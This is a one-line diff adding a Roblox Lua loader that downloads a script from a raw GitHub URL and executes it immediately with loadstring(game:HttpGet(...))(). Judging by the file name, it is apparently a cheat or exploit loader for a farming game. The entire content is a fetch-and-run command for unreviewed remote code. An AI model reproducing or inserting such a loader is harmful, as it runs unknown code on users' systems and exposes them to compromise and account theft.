@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/prehistoric-farm-new-world-spam3-2ubo4tr4eyo2ze.lua"))()
